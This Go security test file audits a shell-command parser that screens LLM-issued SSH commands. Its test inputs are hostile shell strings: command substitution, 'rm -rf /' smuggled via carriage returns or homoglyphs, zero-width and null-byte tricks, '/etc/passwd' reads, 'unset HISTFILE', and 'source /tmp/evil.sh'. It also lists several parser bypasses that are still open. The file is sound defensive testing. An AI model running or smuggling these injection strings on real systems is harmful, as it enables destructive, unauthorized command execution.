package parser

import (
	"strings"
	"testing"
)

// SECURITY AUDIT: Parser Attack Vectors
//
// This file documents attack vectors against the shell command parser and
// provides regression tests for each. The parser is the first line of defense
// in a system that lets LLMs execute commands on remote SSH servers.
//
// Architecture context:
//   1. Parser (parser.go)       → parses shell into AST, rejects dangerous constructs
//   2. Validator (validator.go) → checks command/flag allowlists
//   3. Reconstruct (reconstruct.go) → rebuilds command string with ShellQuote
//   4. SSH execution            → runs reconstructed command on remote server
//
// The parser returns Pipeline{Segments: []PipelineSegment{Command, Args}}.
// The reconstructor re-quotes all tokens with single quotes before execution.
// This means many "parser bypasses" are neutralized by the reconstructor.
// However, the parser should still be as strict as possible (defense in depth).

// ATTACK VECTOR 1: Double-Quoted Expansion Bypass (CRITICAL)
//
// Severity: HIGH (parser bypass, mitigated by reconstructor)
// Status: CURRENT BUG — parser does NOT catch these
//
// The wordToString function (line 143-176) checks Word.Parts for dangerous
// node types: ParamExp, CmdSubst, ProcSubst, ArithmExp, ExtGlob, BraceExp.
// However, it only checks DIRECT children of the Word node. When these
// dangerous constructs appear INSIDE a DblQuoted node, the AST structure is:
//
//   Word → [DblQuoted → [ParamExp{HOME}]]    ← NOT caught (DblQuoted not checked)
//   Word → [ParamExp{HOME}]                  ← caught
//
// This means wrapping ANY expansion in double quotes bypasses ALL expansion checks.
// After the parser's quote stripping (lines 167-174), the returned arg contains
// the raw expansion syntax (e.g., "$HOME", "$(whoami)").
//
// Downstream mitigation: The reconstructor's ShellQuote wraps unsafe tokens in
// single quotes, which prevents bash from expanding them. So "$(whoami)" becomes
// '$(whoami)' in the final SSH command. This is the ONLY thing preventing RCE.

func TestSecurityDoubleQuotedExpansionBypass(t *testing.T) {
	// These must ALL be rejected by the parser. The wordToString function
	// recursively checks inside DblQuoted nodes to catch nested expansions.

	bypasses := []struct {
		name  string
		input string
	}{
		{"variable expansion", `echo "$HOME"`},
		{"command substitution", `echo "$(whoami)"`},
		{"backtick substitution", "echo \"`whoami`\""},
		{"arithmetic expansion", `echo "$((1+2))"`},
		{"param with default", `echo "${HOME:-/root}"`},
		{"param with alt", `echo "${HOME:+/root}"`},
		{"param length", `echo "${#HOME}"`},
		{"param slice", `echo "${HOME:0:5}"`},
		{"array expansion", `echo "${arr[*]}"`},
		{"array at", `echo "${arr[@]}"`},
		{"array index", `echo "${arr[0]}"`},
		{"special var @", `echo "$@"`},
		{"special var *", `echo "$*"`},
		{"special var ?", `echo "$?"`},
		{"special var !", `echo "$!"`},
		{"special var #", `echo "$#"`},
		{"special var 0", `echo "$0"`},
		{"special var _", `echo "$_"`},
	}

	for _, tc := range bypasses {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Parse(tc.input)
			if err == nil {
				t.Fatalf("Parse(%q) should have been rejected but was accepted", tc.input)
			}
		})
	}
}

func TestSecurityDoubleQuotedCmdSubstBypass(t *testing.T) {
	// Command substitution inside double quotes must be rejected by the parser.
	// This is the most dangerous variant — if it passed through, it would be RCE.

	_, err := Parse(`echo "$(whoami)"`)
	if err == nil {
		t.Fatalf("Parse(`echo \"$(whoami)\"`) should have been rejected but was accepted")
	}
}

func TestSecurityDoubleQuotedMixedContent(t *testing.T) {
	// Expansion buried inside other text within double quotes must be rejected.
	_, err := Parse(`echo "hello $(whoami) world"`)
	if err == nil {
		t.Fatalf("Parse(`echo \"hello $(whoami) world\"`) should have been rejected but was accepted")
	}
}

// ATTACK VECTOR 2: ANSI-C Quoting ($'...')
//
// Severity: MEDIUM
// Status: Parser allows through (not explicitly checked)
//
// $'...' is ANSI-C quoting. In bash, $'\x41' = 'A', $'\n' = newline, etc.
// The parser doesn't check for this construct. The printer outputs it literally
// (e.g., "$'hello\\nworld'") and quote stripping does NOT apply (word starts
// with '$', not '\'' or '"').
//
// Impact: The returned arg string contains literal "$'...'" syntax. If
// reconstructed and passed to bash, the single quotes from ShellQuote will
// prevent bash from interpreting the $'...' as ANSI-C quoting. However,
// $'...' as a COMMAND NAME bypasses the validator's string-match check
// (the command name will be "$'ls'" not "ls").

func TestSecurityANSICQuotingPassesThrough(t *testing.T) {
	// $'...' passes through the parser — it's not a ParamExp, CmdSubst, etc.
	// mvdan.cc/sh parses it as a SglQuoted node with Dollar=true.

	cases := []struct {
		name    string
		input   string
		wantArg string
	}{
		{"basic", `echo $'hello'`, "$'hello'"},
		{"with newline escape", `echo $'line1\nline2'`, "$'line1\\nline2'"},
		{"with null escape", `echo $'hello\x00world'`, "$'hello\\x00world'"},
		{"with semicolon hex", `echo $'ls\x3brm'`, "$'ls\\x3brm'"},
		{"with pipe hex", `echo $'ls\x7crm'`, "$'ls\\x7crm'"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p, err := Parse(tc.input)
			if err != nil {
				t.Skipf("Parser now rejects this: %v", err)
			}
			if len(p.Segments[0].Args) == 0 {
				t.Fatalf("no args")
			}
			if got := p.Segments[0].Args[0]; got != tc.wantArg {
				t.Fatalf("arg = %q, want %q", got, tc.wantArg)
			}
		})
	}
}

func TestSecurityANSICQuotingAsCommandName(t *testing.T) {
	// Using $'...' as the command name. The parser returns it with the $'...'
	// syntax intact. The validator will look up "$'ls'" in the registry, not "ls".
	// This means the command won't match any allowlisted command — safe.
	// But worth documenting.

	p, err := Parse(`$'ls' /tmp`)
	if err != nil {
		t.Skipf("Parser now rejects this: %v", err)
	}
	if got := p.Segments[0].Command; got != "$'ls'" {
		t.Fatalf("Command = %q, want %q", got, "$'ls'")
	}
}

// ATTACK VECTOR 3: Locale Quoting ($"...")
//
// Severity: LOW
// Status: Parser allows through
//
// $"..." is locale-specific string translation in bash. Very rarely used,
// but the parser doesn't check for it. Behavior similar to $'...' — the
// printer outputs it literally, no quote stripping applies.

func TestSecurityLocaleQuotingPassesThrough(t *testing.T) {
	p, err := Parse(`echo $"hello"`)
	if err != nil {
		t.Skipf("Parser now rejects this: %v", err)
	}
	if len(p.Segments[0].Args) == 0 {
		t.Fatalf("no args")
	}
	if got := p.Segments[0].Args[0]; got != `$"hello"` {
		t.Fatalf("arg = %q, want %q", got, `$"hello"`)
	}
}

// ATTACK VECTOR 4: Null Byte Injection
//
// Severity: LOW (parser silently drops null bytes)
// Status: Null bytes are silently stripped by the parser/printer
//
// Null bytes in the command string are silently dropped. "rm\x00_safe" becomes
// "rm_safe". This is unlikely to be exploitable since the null just gets removed,
// but it could cause confusion between what the user sees and what executes.

func TestSecurityNullByteDropped(t *testing.T) {
	p, err := Parse("rm\x00_safe -rf /")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Null byte silently dropped — "rm_safe" not "rm"
	if got := p.Segments[0].Command; got != "rm_safe" {
		t.Fatalf("Command = %q, want %q (null byte handling changed?)", got, "rm_safe")
	}
}

func TestSecurityNullByteBetweenWords(t *testing.T) {
	// Null byte between "ls" and space
	p, err := Parse("ls\x00 /tmp")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// The null is dropped, leaving "ls" as the command
	if got := p.Segments[0].Command; got != "ls" {
		t.Fatalf("Command = %q, want %q", got, "ls")
	}
}

// ATTACK VECTOR 5: Zero-Width Unicode Characters
//
// Severity: MEDIUM (validator bypass potential)
// Status: Parser preserves zero-width characters in command names and args
//
// Zero-width characters (U+200B zero-width space, U+200C ZWNJ, U+200D ZWJ,
// U+FEFF BOM) are embedded in command names and args. The parser preserves them.
// A command name of "l\u200ds" won't match "ls" in the validator — which is the
// correct/safe behavior. But if the downstream SSH server's shell strips these
// characters before command lookup, it could execute "ls" when the validator
// rejected "l\u200ds" because it wasn't in the allowlist.

func TestSecurityZeroWidthCharsPreserved(t *testing.T) {
	cases := []struct {
		name    string
		input   string
		wantCmd string
	}{
		{"zero-width space", "ls\u200b /tmp", "ls\u200b"},
		{"zero-width joiner", "l\u200ds /tmp", "l\u200ds"},
		{"zero-width non-joiner", "l\u200cs /tmp", "l\u200cs"},
		{"BOM prefix", "\uFEFFls /tmp", "\uFEFFls"},
		{"BOM mid-word", "l\uFEFFs /tmp", "l\uFEFFs"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p, err := Parse(tc.input)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got := p.Segments[0].Command; got != tc.wantCmd {
				t.Fatalf("Command = %q, want %q", got, tc.wantCmd)
			}
		})
	}
}

// ATTACK VECTOR 6: Soft Hyphen / RTL Override in Paths
//
// Severity: LOW (visual confusion only — validator will reject unknown commands)
// Status: Parser preserves these characters
//
// Soft hyphen (U+00AD) is invisible in many renderers. "/bi\u00ADn/ls" looks
// like "/bin/ls" but is a different string. RTL override (U+202E) reverses text
// direction, making malicious commands look benign in terminal output.

func TestSecuritySoftHyphenInPath(t *testing.T) {
	p, err := Parse("/bi\u00ADn/ls /tmp")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Soft hyphen preserved — this won't match "/bin/ls" in validator
	if got := p.Segments[0].Command; got != "/bi\u00ADn/ls" {
		t.Fatalf("Command = %q, want %q", got, "/bi\u00ADn/ls")
	}
}

func TestSecurityRTLOverridePreserved(t *testing.T) {
	p, err := Parse("ls \u202E/tmp")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// RTL override character preserved in arg
	if len(p.Segments[0].Args) == 0 {
		t.Fatalf("no args")
	}
	arg := p.Segments[0].Args[0]
	if !strings.Contains(arg, "\u202E") {
		t.Fatalf("arg = %q, expected RTL override char", arg)
	}
}

// ATTACK VECTOR 7: Fullwidth Unicode Homoglyphs
//
// Severity: INFORMATIONAL (not a bypass — parser treats them as literal chars)
// Status: Parser correctly treats fullwidth chars as part of word, not operators
//
// Fullwidth semicolons (U+FF1B), pipes (U+FF5C), ampersands (U+FF06) are visually
// similar to their ASCII counterparts but are NOT shell metacharacters. The shell
// parser correctly treats them as literal characters within words, not operators.

func TestSecurityFullwidthHomoglyphsAreLiteral(t *testing.T) {
	cases := []struct {
		name         string
		input        string
		wantSegments int
	}{
		{"fullwidth semicolon", "ls /tmp\uFF1B rm -rf /", 1}, // all one segment
		{"fullwidth pipe", "ls /tmp\uFF5C rm -rf /", 1},
		{"fullwidth ampersand", "ls /tmp\uFF06\uFF06 rm -rf /", 1},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p, err := Parse(tc.input)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got := len(p.Segments); got != tc.wantSegments {
				t.Fatalf("segments = %d, want %d", got, tc.wantSegments)
			}
		})
	}
}

// ATTACK VECTOR 8: Carriage Return (\r) Not Treated as Statement Separator
//
// Severity: INFORMATIONAL (no bypass)
// Status: Correctly handled — \r is literal, not a separator
//
// Bare \r (without \n) is not a statement separator in bash. The parser/printer
// treats it as part of the word content. "ls /tmp\rrm -rf /" is parsed as
// one statement with "ls" as the command and ["/tmp", "rm", "-rf", "/"] as args.
// The \r is embedded in the "/tmp" arg (or between words, depending on printer).

func TestSecurityCarriageReturnNotSeparator(t *testing.T) {
	p, err := Parse("ls /tmp\rrm -rf /")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Should be ONE segment — \r is not a statement separator
	if got := len(p.Segments); got != 1 {
		t.Fatalf("segments = %d, want 1 (CR should not be a separator)", got)
	}
	if got := p.Segments[0].Command; got != "ls" {
		t.Fatalf("Command = %q, want %q", got, "ls")
	}
}

// ATTACK VECTOR 9: Form Feed / Vertical Tab Printer Misrepresentation
//
// Severity: LOW (cosmetic, no security impact due to reconstructor)
// Status: Parser preserves these as part of word content
//
// Vertical tab (\v, 0x0B) and form feed (\f, 0x0C) are not whitespace in bash.
// They become part of the word. The syntax printer may represent them as spaces
// or newlines in the printed output, but the actual word content is preserved.
// The command name "ls\v/tmp" is a single word — not "ls" with arg "/tmp".

func TestSecurityVerticalTabInWord(t *testing.T) {
	p, err := Parse("ls\v/tmp")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// \v is part of the word — command is the whole thing
	if got := len(p.Segments); got != 1 {
		t.Fatalf("segments = %d, want 1", got)
	}
	// The printer may split this into command + args; either way the
	// combined content must contain both "ls" and "/tmp" as one word
	// (no security-relevant separation).
	combined := p.Segments[0].Command
	for _, a := range p.Segments[0].Args {
		combined += a
	}
	if !strings.Contains(combined, "ls") || !strings.Contains(combined, "/tmp") {
		t.Fatalf("expected vertical-tab word to contain both ls and /tmp, got Command=%q Args=%v",
			p.Segments[0].Command, p.Segments[0].Args)
	}
}

func TestSecurityFormFeedInWord(t *testing.T) {
	p, err := Parse("ls\f/tmp")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if got := len(p.Segments); got != 1 {
		t.Fatalf("segments = %d, want 1", got)
	}
	// Form feed becomes part of the command name
	// Printer may convert \f to \n — this is a printer artifact
	cmd := p.Segments[0].Command
	if !strings.Contains(cmd, "/tmp") {
		t.Fatalf("Command = %q, expected it to contain /tmp (FF not a separator)", cmd)
	}
}

// ATTACK VECTOR 10: Quote Concatenation Produces Residual Quotes
//
// Severity: LOW (actually safe — residual quotes prevent validator match)
// Status: By-design behavior, but surprising
//
// When shell words use concatenated quoting (e.g., 'foo'"bar"), the printer
// preserves the concatenation. The quote stripping (lines 167-174) only strips
// when word[0] and word[len-1] are matching quote types. Concatenated words
// have mismatched start/end chars, so quotes are NOT stripped.
//
// This means 'r''m' → command="r''m" (not "rm"). The validator won't find
// "r''m" in the allowlist → rejected. This is actually SAFE behavior.

func TestSecurityConcatenatedQuotesNotStripped(t *testing.T) {
	cases := []struct {
		name    string
		input   string
		wantCmd string
	}{
		{"single+single", `'r''m' -rf /`, "r''m"},
		{"double+double", `"r""m" -rf /`, `r""m`},
		{"bare+double", `r"m" -rf /`, `r"m"`},
		{"single+bare", `'r'm -rf /`, `'r'm`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p, err := Parse(tc.input)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got := p.Segments[0].Command; got != tc.wantCmd {
				t.Fatalf("Command = %q, want %q", got, tc.wantCmd)
			}
			// These all contain residual quotes → won't match validator allowlist → SAFE
		})
	}
}

// ATTACK VECTOR 11: Quote Stripping on Nested Quotes (Double-inside-Single)
//
// Severity: INFORMATIONAL
// Status: Correct behavior
//
// '"rm"' (double quotes inside single quotes) → printer outputs '"rm"' →
// starts/ends with ' → stripped to "rm" (includes literal double quotes).
// This won't match "rm" in the validator → safe.

func TestSecurityNestedQuotesRetainInner(t *testing.T) {
	cases := []struct {
		name    string
		input   string
		wantCmd string
	}{
		{"double inside single", `'"rm"' -rf /`, `"rm"`},
		{"single inside double", `"'rm'" -rf /`, `'rm'`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p, err := Parse(tc.input)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got := p.Segments[0].Command; got != tc.wantCmd {
				t.Fatalf("Command = %q, want %q", got, tc.wantCmd)
			}
		})
	}
}

// ATTACK VECTOR 12: Backslash Preservation in Output
//
// Severity: INFORMATIONAL (safe due to reconstructor)
// Status: Parser preserves backslash escapes in output
//
// Backslash-escaped characters retain the backslash in the parsed output.
// E.g., "echo \$HOME" → arg="\$HOME". This is actually correct — the
// backslash IS part of the bash word as the parser sees it. If the downstream
// reconstructor faithfully re-quotes this, the backslash will be preserved
// and $HOME won't expand.

func TestSecurityBackslashEscapesPreserved(t *testing.T) {
	p := mustParse(t, `echo \$HOME`)
	if got := p.Segments[0].Args[0]; got != `\$HOME` {
		t.Fatalf("arg = %q, want %q", got, `\$HOME`)
	}
}

func TestSecurityBackslashSemicolon(t *testing.T) {
	// Backslash-semicolon: not a statement separator, just a literal arg
	p := mustParse(t, `ls /tmp\; rm -rf /`)
	if got := len(p.Segments); got != 1 {
		t.Fatalf("segments = %d, want 1 (escaped semicolon is not a separator)", got)
	}
	if got := p.Segments[0].Command; got != "ls" {
		t.Fatalf("Command = %q, want %q", got, "ls")
	}
}

// ATTACK VECTOR 13: Tilde Expansion
//
// Severity: MEDIUM (information disclosure potential)
// Status: Parser allows tilde through — deferred to validator
//
// The parser does not check for tilde expansion. ~ expands to $HOME in bash.
// ~root expands to root's home directory. ~+ and ~- expand to PWD and OLDPWD.
// The parser passes these through as literal strings. The reconstructor
// single-quotes them, preventing expansion. But if the downstream ever changes
// to pass these unquoted, home directories could be disclosed.

func TestSecurityTildeExpansionPassesThrough(t *testing.T) {
	cases := []struct {
		name    string
		input   string
		wantArg string
	}{
		{"tilde home", "ls ~", "~"},
		{"tilde root", "ls ~root", "~root"},
		{"tilde path", "cat ~/secrets", "~/secrets"},
		{"tilde plus", "cd ~+", "~+"},
		{"tilde minus", "cd ~-", "~-"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p, err := Parse(tc.input)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if len(p.Segments[0].Args) == 0 {
				t.Fatalf("no args")
			}
			if got := p.Segments[0].Args[0]; got != tc.wantArg {
				t.Fatalf("arg = %q, want %q", got, tc.wantArg)
			}
		})
	}
}

// ATTACK VECTOR 14: Glob Patterns Pass Through Parser
//
// Severity: LOW (deferred to validator, which checks positional args)
// Status: By design — globs are checked by the validator
//
// The parser allows *, ?, and [bracket] glob patterns. These are intentionally
// deferred to the validator, which rejects them in positional args unless the
// manifest allows it (via RegexArgPosition).

func TestSecurityGlobPatternsPassParser(t *testing.T) {
	cases := []struct {
		name    string
		input   string
		wantArg string
	}{
		{"star", "ls *.log", "*.log"},
		{"question", "ls ?.log", "?.log"},
		{"bracket", "ls [abc].log", "[abc].log"},
		{"recursive", "ls **/*.go", "**/*.go"},
		{"wildcard path", "cat /tmp/*/secret", "/tmp/*/secret"},
		{"hidden files", "ls .*", ".*"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p := mustParse(t, tc.input)
			if len(p.Segments[0].Args) == 0 {
				t.Fatalf("no args")
			}
			if got := p.Segments[0].Args[0]; got != tc.wantArg {
				t.Fatalf("arg = %q, want %q", got, tc.wantArg)
			}
		})
	}
}

// ATTACK VECTOR 15: Extended Globs Correctly Rejected
//
// Severity: N/A (properly handled)
// Status: DEFENDED

func TestSecurityExtGlobRejected(t *testing.T) {
	for _, input := range []string{
		"ls ?(foo|bar)",
		"ls *(foo|bar)",
		"ls +(foo|bar)",
		"ls @(foo|bar)",
		"ls !(foo|bar)",
	} {
		mustParseErr(t, input, "Extended glob")
	}
}

// ATTACK VECTOR 16: Brace Expansion / Quote Exemption Edge Cases
//
// Severity: LOW
// Status: Mostly defended, one false positive (partially-quoted braces rejected
//         even when they're literal)
//
// The brace check at line 164 rejects words containing {} unless wrapped in
// quotes. This has a false positive: echo foo'{'bar'}' is rejected even though
// the braces are literal (inside single quotes). This is overly strict but safe.

func TestSecurityBraceExpansionRejected(t *testing.T) {
	mustParseErr(t, "echo {a,b,c}", "Brace expansion")
	mustParseErr(t, "echo a{b,c}d", "Brace expansion")
	mustParseErr(t, `echo \{a,b\}`, "Brace expansion")
}

func TestSecurityBracesAllowedInQuotes(t *testing.T) {
	// Braces inside quotes are literal — should be allowed
	p := mustParse(t, `echo "{a,b,c}"`)
	if got := p.Segments[0].Args[0]; got != "{a,b,c}" {
		t.Fatalf("arg = %q, want %q", got, "{a,b,c}")
	}

	p2 := mustParse(t, `echo '{a,b,c}'`)
	if got := p2.Segments[0].Args[0]; got != "{a,b,c}" {
		t.Fatalf("arg = %q, want %q", got, "{a,b,c}")
	}
}

func TestSecurityBraceSplitAcrossArgs(t *testing.T) {
	// Braces split across separate args — each arg is checked independently
	p := mustParse(t, `echo "}" "{"`)
	if got := p.Segments[0].Args[0]; got != "}" {
		t.Fatalf("arg[0] = %q, want %q", got, "}")
	}
	if got := p.Segments[0].Args[1]; got != "{" {
		t.Fatalf("arg[1] = %q, want %q", got, "{")
	}
}

func TestSecurityFindBracesQuoted(t *testing.T) {
	// Common find pattern: -exec rm "{}" \;
	// "{}" is quoted — passes the brace check. After stripping: {}
	p := mustParse(t, `find . -exec rm "{}" \;`)
	found := false
	for _, arg := range p.Segments[0].Args {
		if arg == "{}" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected {} in args, got %v", p.Segments[0].Args)
	}
}

func TestSecurityFindBracesUnquoted(t *testing.T) {
	// Unquoted {} — rejected by brace check (false positive but safe)
	mustParseErr(t, `find . -exec rm {} \;`, "Brace expansion")
}

// ATTACK VECTOR 17: Newlines Inside Quoted Strings
//
// Severity: LOW (safe — single arg with literal newline)
// Status: Allowed by design
//
// Newlines inside quoted strings are literal characters, not statement separators.
// The parser correctly treats them as part of a single argument.

func TestSecurityNewlineInQuotedString(t *testing.T) {
	p := mustParse(t, "echo \"hello\nworld\"")
	if got := p.Segments[0].Args[0]; got != "hello\nworld" {
		t.Fatalf("arg = %q, want %q", got, "hello\nworld")
	}

	p2 := mustParse(t, "echo 'hello\nworld'")
	if got := p2.Segments[0].Args[0]; got != "hello\nworld" {
		t.Fatalf("arg = %q, want %q", got, "hello\nworld")
	}
}

// ATTACK VECTOR 18: Backslash-Newline Continuation
//
// Severity: INFORMATIONAL (safe — just line continuation)
// Status: Allowed by design
//
// Backslash-newline is line continuation in bash. The parser correctly handles
// it — the backslash-newline pair is removed and the next line continues the word.

func TestSecurityBackslashNewlineContinuation(t *testing.T) {
	p := mustParse(t, "ls \\\n/tmp")
	if got := p.Segments[0].Command; got != "ls" {
		t.Fatalf("Command = %q, want %q", got, "ls")
	}
	if got := p.Segments[0].Args[0]; got != "/tmp" {
		t.Fatalf("arg = %q, want %q", got, "/tmp")
	}
}

// ATTACK VECTOR 19: Comment Stripping Interaction
//
// Severity: INFORMATIONAL (safe — comments are stripped before statement counting)
// Status: Correct behavior
//
// Comments (#) are stripped by the parser before statement counting. This means
// "ls #\nrm -rf /" is still two statements (ls and rm), correctly rejected.

func TestSecurityCommentDoesNotHideNewline(t *testing.T) {
	mustParseErr(t, "ls #\nrm -rf /", "Semicolons")
}

func TestSecurityCommentStripsArgs(t *testing.T) {
	// "ls /tmp # comment" — the comment is stripped, only /tmp remains
	p := mustParse(t, "ls /tmp # this is a comment")
	if got := len(p.Segments[0].Args); got != 1 {
		t.Fatalf("args count = %d, want 1 (comment should be stripped)", got)
	}
	if got := p.Segments[0].Args[0]; got != "/tmp" {
		t.Fatalf("arg = %q, want %q", got, "/tmp")
	}
}

// ATTACK VECTOR 20: Resource Exhaustion
//
// Severity: LOW (DoS potential)
// Status: DEFENDED — limits enforced on command length, pipe segments, and args
//
// The parser enforces:
//   - MaxCommandLength (64KB) on total input size
//   - MaxPipeSegments (32) on pipeline segment count
//   - MaxArgsPerSegment (1024) on arguments per command segment

func TestSecurityLargeInputRejected(t *testing.T) {
	// 100KB argument exceeds MaxCommandLength (64KB)
	mustParseErr(t, "echo "+strings.Repeat("a", 100000), "Command too long")
}

func TestSecurityInputAtLimitAccepted(t *testing.T) {
	// Input just under the limit should be accepted
	input := "echo " + strings.Repeat("a", MaxCommandLength-6) // "echo " = 5 bytes + content
	p := mustParse(t, input)
	if len(p.Segments[0].Args) == 0 {
		t.Fatal("expected args")
	}
}

func TestSecurityManyPipeSegmentsRejected(t *testing.T) {
	// 100 pipe segments exceeds MaxPipeSegments (32)
	input := strings.TrimSuffix(strings.Repeat("cat | ", 100), " | ")
	mustParseErr(t, input, "Too many pipeline segments")
}

func TestSecurityPipeSegmentsAtLimitAccepted(t *testing.T) {
	// Exactly MaxPipeSegments should be accepted
	parts := make([]string, MaxPipeSegments)
	for i := range parts {
		parts[i] = "cat"
	}
	input := strings.Join(parts, " | ")
	p := mustParse(t, input)
	if got := len(p.Segments); got != MaxPipeSegments {
		t.Fatalf("segments = %d, want %d", got, MaxPipeSegments)
	}
}

func TestSecurityManyArgsRejected(t *testing.T) {
	// 2000 arguments exceeds MaxArgsPerSegment (1024)
	mustParseErr(t, "echo "+strings.Repeat("arg ", 2000), "Too many arguments")
}

func TestSecurityArgsAtLimitAccepted(t *testing.T) {
	// Exactly MaxArgsPerSegment args (including command) should be accepted
	// c.Args includes the command itself, so MaxArgsPerSegment args total
	parts := make([]string, MaxArgsPerSegment)
	parts[0] = "echo"
	for i := 1; i < MaxArgsPerSegment; i++ {
		parts[i] = "a"
	}
	input := strings.Join(parts, " ")
	p := mustParse(t, input)
	if got := len(p.Segments[0].Args) + 1; got != MaxArgsPerSegment {
		t.Fatalf("total words = %d, want %d", got, MaxArgsPerSegment)
	}
}

// ATTACK VECTOR 21: Control Flow Correctly Rejected
//
// Severity: N/A (properly handled)
// Status: DEFENDED

func TestSecurityControlFlowRejected(t *testing.T) {
	cases := []struct {
		input    string
		contains string
	}{
		{"if true; then echo yes; fi", "not allowed"},
		{"while true; do echo loop; done", "not allowed"},
		{"for i in 1 2 3; do echo $i; done", "not allowed"},
		{"case x in y) echo z;; esac", "not allowed"},
		{"until false; do echo loop; done", "not allowed"},
		{"coproc cat", "not allowed"},
		{"time ls", "not allowed"},
		{"{ ls; echo done; }", "not allowed"},
		{"[[ -f /etc/passwd ]]", "not allowed"},
		{"(( x++ ))", "not allowed"},
		{"foo() { echo bar; }", "not allowed"},
		{"(ls /tmp)", "not allowed"},
	}
	for _, tc := range cases {
		mustParseErr(t, tc.input, tc.contains)
	}
}

// ATTACK VECTOR 22: Statement Separator Variants
//
// Severity: N/A (properly handled)
// Status: DEFENDED

func TestSecurityStatementSeparatorsRejected(t *testing.T) {
	mustParseErr(t, "ls; rm", "Semicolons")
	mustParseErr(t, "ls\nrm", "Semicolons")
	mustParseErr(t, "ls & rm", "") // background + next stmt
	mustParseErr(t, "ls #comment\nrm", "Semicolons")
	mustParseErr(t, "; ls /tmp", "parse error")
	mustParseErr(t, "ls /tmp\r\nrm -rf /", "Semicolons")
}

// ATTACK VECTOR 23: Operator / Redirection / Assignment Variants
//
// Severity: N/A (properly handled)
// Status: DEFENDED

func TestSecurityRedirectionsRejected(t *testing.T) {
	for _, input := range []string{
		"grep error > /tmp/out",
		"echo data >> /tmp/out",
		"ls 2> /tmp/errors",
		"cat < /etc/passwd",
		"cat << EOF\nhello\nEOF",
		"cat <<< 'hello'",
		"ls 2>&1",
		"exec 3>/tmp/evil",
		"ls 1>&2",
	} {
		mustParseErr(t, input, "")
	}
}

func TestSecurityAssignmentsRejected(t *testing.T) {
	for _, input := range []string{
		"PATH=/evil ls",
		"FOO=bar",
		"declare -x FOO=bar",
		"typeset -i NUM=42",
		"local VAR=val",
		"export PATH=/evil",
		"readonly PROTECTED=yes",
		"export FOO=bar",
	} {
		mustParseErr(t, input, "")
	}
}

func TestSecurityBackgroundRejected(t *testing.T) {
	mustParseErr(t, "sleep 10 &", "Background execution")
}

// ATTACK VECTOR 24: Expansions / Substitutions (Bare)
//
// Severity: N/A (properly handled)
// Status: DEFENDED

func TestSecurityBareExpansionsRejected(t *testing.T) {
	mustParseErr(t, "echo $HOME", "will not expand")
	mustParseErr(t, "echo ${HOME:-/root}", "will not expand")
	mustParseErr(t, "echo $(whoami)", "Command substitution")
	mustParseErr(t, "echo `whoami`", "Command substitution")
	mustParseErr(t, "diff <(ls /tmp) <(ls /var)", "Process substitution")
	mustParseErr(t, "echo $((1+2))", "Arithmetic expansion")
	mustParseErr(t, "echo {a,b,c}", "Brace expansion")
	mustParseErr(t, "echo ${arr[*]}", "will not expand")
	mustParseErr(t, "echo ${arr[@]}", "will not expand")
}

// ATTACK VECTOR 25: Operator Smuggling in Quoted Strings
//
// Severity: INFORMATIONAL (safe — operators in quotes are literal args)
// Status: Correct behavior
//
// Shell operators inside quotes are NOT operators — they're literal text.
// The parser correctly treats them as word content. After quote stripping,
// the arg may contain "; | &" etc., but these are just characters in a string,
// not shell operators. The reconstructor re-quotes them, keeping them literal.

func TestSecurityOperatorsInQuotesAreLiteral(t *testing.T) {
	cases := []struct {
		name    string
		input   string
		wantArg string
	}{
		{"semicolon in single", `echo 'ls; rm -rf /'`, "ls; rm -rf /"},
		{"pipe in double", `echo "ls | rm"`, "ls | rm"},
		{"ampersand in double", `echo "ls & rm"`, "ls & rm"},
		{"backtick in single", "echo '`whoami`'", "`whoami`"},
		{"dollar-paren in single", "echo '$(whoami)'", "$(whoami)"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p := mustParse(t, tc.input)
			if got := p.Segments[0].Args[0]; got != tc.wantArg {
				t.Fatalf("arg = %q, want %q", got, tc.wantArg)
			}
			// These are literal strings — not interpreted as operators.
			// The reconstructor will re-quote them for safety.
		})
	}
}

// ATTACK VECTOR 26: Path-Based Commands (Deferred to Validator)
//
// Severity: N/A at parser level (validator responsibility)
// Status: By design — parser passes these through

func TestSecurityPathBasedCommandsPassParser(t *testing.T) {
	cases := []struct {
		input   string
		wantCmd string
	}{
		{"/bin/rm -rf /", "/bin/rm"},
		{"./evil", "./evil"},
		{"../../../bin/bash", "../../../bin/bash"},
		{"/usr/bin/env bash", "/usr/bin/env"},
	}
	for _, tc := range cases {
		p := mustParse(t, tc.input)
		if got := p.Segments[0].Command; got != tc.wantCmd {
			t.Fatalf("Command = %q, want %q", got, tc.wantCmd)
		}
	}
}

// ATTACK VECTOR 27: "Dangerous but Syntactically Simple" Commands
//
// Severity: N/A at parser level (validator responsibility)
// Status: By design — parser passes these through
//
// Commands like eval, source, exec, env, command, builtin are syntactically
// simple CallExpr nodes. The parser intentionally passes them through for the
// validator to check against the allowlist.

func TestSecurityDangerousBuiltinsPassParser(t *testing.T) {
	dangerousCommands := []string{
		"eval ls",
		"source /tmp/evil.sh",
		". /tmp/evil.sh",
		"exec /bin/bash",
		"command ls /tmp",
		"builtin echo hello",
		"env PATH=/evil ls",
		"unset HISTFILE",
	}

